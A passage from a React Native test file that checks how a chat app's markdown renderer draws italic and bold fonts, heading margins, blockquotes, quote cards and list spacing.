    expect(queryByTestId("callout-tip")).toBeNull();
    expect(queryByTestId("quote-card")).toBeNull();
    expect(JSON.stringify(toJSON())).not.toContain("lightbulb");

    const legacy = await render(
      <MarkdownContent content={"```tip\nsave a copy\n```"} />,
    );
    expect(legacy.getByText(/save a copy/)).toBeOnTheScreen();
    expect(JSON.stringify(legacy.toJSON())).not.toContain("lightbulb");
  });
});

describe("emphasis faces", () => {
  // A one-file family has no italic or bold slot: the face must be the file.
  function faceOf(node: {
    props: { style?: StyleProp<TextStyle> };
    parent: unknown;
  }): string | undefined {
    let current: {
      props: { style?: StyleProp<TextStyle> };
      parent: unknown;
    } | null = node;
    while (current) {
      const family = StyleSheet.flatten(current.props.style)?.fontFamily;
      if (family) return family;
      current = current.parent as typeof current;
    }
    return undefined;
  }

  it("draws *italic* with the italic file, never fontStyle", async () => {
    const { getByText } = await render(
      <MarkdownContent content="A *soft* word" />,
    );
    const leaf = getByText("soft");
    expect(faceOf(leaf)).toBe("SourceSans3-Italic");
    expect(StyleSheet.flatten(leaf.props.style)?.fontStyle).not.toBe("italic");
  });

  it("draws ***both*** with the bold italic file", async () => {
    const { getByText } = await render(
      <MarkdownContent content="A ***loud*** word" />,
    );
    expect(faceOf(getByText("loud"))).toBe("SourceSans3-BoldItalic");
  });

  it("keeps **bold** bold inside a table cell", async () => {
    const md = "| Plan | Price |\n| --- | --- |\n| **Pro** | $5 |";
    const { getByText } = await render(<MarkdownContent content={md} />);
    expect(faceOf(getByText("Pro"))).toBe("SourceSans3-Bold");
    expect(faceOf(getByText("$5"))).toBe("SourceSans3");
  });
});

describe("reply rhythm", () => {
  it("drops the top margin of a heading that opens the reply", async () => {
    const { toJSON } = await render(
      <MarkdownContent content={"# Title\n\nBody text"} />,
    );
    const tree = toJSON() as { props: { style?: StyleProp<TextStyle> } } | null;
    const top = StyleSheet.flatten(tree?.props.style)?.marginTop;
    const heading = StyleSheet.flatten(
      makeMdStyles(lightTheme).heading1,
    )?.marginTop;
    expect(heading).toBeGreaterThan(0);
    expect(top).toBe(-(heading as number));
  });

  it("leaves a reply that opens with text where it is", async () => {
    const { toJSON } = await render(
      <MarkdownContent content={"Body text\n\n# Later"} />,
    );
    const tree = toJSON() as { props: { style?: StyleProp<TextStyle> } } | null;
    expect(StyleSheet.flatten(tree?.props.style)?.marginTop).toBeUndefined();
  });

  it("sizes inline code to the heading it sits in", async () => {
    const { getByText } = await render(
      <MarkdownContent content={"## Use `map` here"} />,
    );
    const size = StyleSheet.flatten(getByText("map").props.style)?.fontSize;
    expect(size).toBeGreaterThan(14);
  });

  it("draws a rule beside an ordinary blockquote", async () => {
    const { getByTestId } = await render(
      <MarkdownContent content={"> just an aside"} />,
    );
    const style = StyleSheet.flatten(getByTestId("indented-prose").props.style);
    expect(style.borderLeftWidth).toBeGreaterThan(0);
    expect(style.marginTop).toBe(0);
  });

  it("draws an ordinary blockquote with a visible rule and secondary ink at body size", async () => {
    const { getByTestId, getByText } = await render(
      <MarkdownContent
        content={
          "> An aside with **weight**, `code` and [a link](https://example.com)"
        }
      />,
    );
    const rule = StyleSheet.flatten(getByTestId("indented-prose").props.style);
    expect(rule.borderLeftWidth).toBe(3);
    expect(rule.borderLeftColor).toBe(lightTheme.textDisabled);
    const prose = StyleSheet.flatten(getByText("An aside with ").props.style);
    expect(prose.color).toBe(lightTheme.textSecondary);
    expect(prose.fontSize).toBe(Type.body.fontSize);
    expect(StyleSheet.flatten(getByText("weight").props.style).color).toBe(
      lightTheme.textSecondary,
    );
    expect(StyleSheet.flatten(getByText("code").props.style).color).toBe(
      lightTheme.textSecondary,
    );
    // A link keeps its own color inside the quote.
    expect(StyleSheet.flatten(getByText("a link").props.style).color).toBe(
      lightTheme.primary,
    );
  });

  it("outlines a quote card with a visible border and keeps its quote in body ink", async () => {
    const { getByTestId, getByText } = await render(
      <MarkdownContent content={"> To be or not to be.\n> — Shakespeare"} />,
    );
    const card = StyleSheet.flatten(getByTestId("quote-card").props.style);
    expect(card.borderWidth).toBe(1);
    expect(card.borderColor).toBe(lightTheme.border);
    expect(
      StyleSheet.flatten(getByText("To be or not to be.").props.style).color,
    ).toBe(lightTheme.assistantText);
  });
});

describe("list rhythm", () => {
  type Host = { parent?: unknown; props: { style?: StyleProp<TextStyle> } };
  /** The bottom margin of the list item that holds this marker. */
  function itemGap(marker: Host) {
    const item = marker.parent as Host;
    return StyleSheet.flatten(item.props.style)?.marginBottom ?? 0;
  }

  it("ends a list with the block gap alone", async () => {
    const { getAllByTestId } = await render(
      <MarkdownContent content={"- one\n- two\n- three\n\nAfter."} />,
    );
    const bullets = getAllByTestId("md-list-bullet");
    expect(bullets.map((bullet) => itemGap(bullet))).toEqual([
      Space.xs,
      Space.xs,
      0,
    ]);
    const list = bullets[0].parent as Host;
    expect(
      StyleSheet.flatten((list.parent as Host).props.style)?.marginBottom,
    ).toBe(PARAGRAPH_GAP);
  });

  it("ends a numbered list the same way", async () => {
    const { getByText } = await render(
      <MarkdownContent content={"1. one\n2. two\n3. three"} />,
    );
    expect(["1.", "2.", "3."].map((n) => itemGap(getByText(n)))).toEqual([
      Space.xs,
      Space.xs,
      0,
    ]);
  });

  it("ends a nested list flush so its parent item's gap separates it", async () => {
    const { getAllByTestId, getByTestId } = await render(
      <MarkdownContent
        content={"- Parent\n  - child a\n  - child b\n- Last"}
      />,
    );
    // child a, child b (nested), then Last.
    expect(getAllByTestId("md-list-bullet").map((b) => itemGap(b))).toEqual([
      Space.xs,
      0,
      0,
    ]);
    expect(itemGap(getByTestId("md-list-bullet-spacer"))).toBe(Space.xs);
  });
});
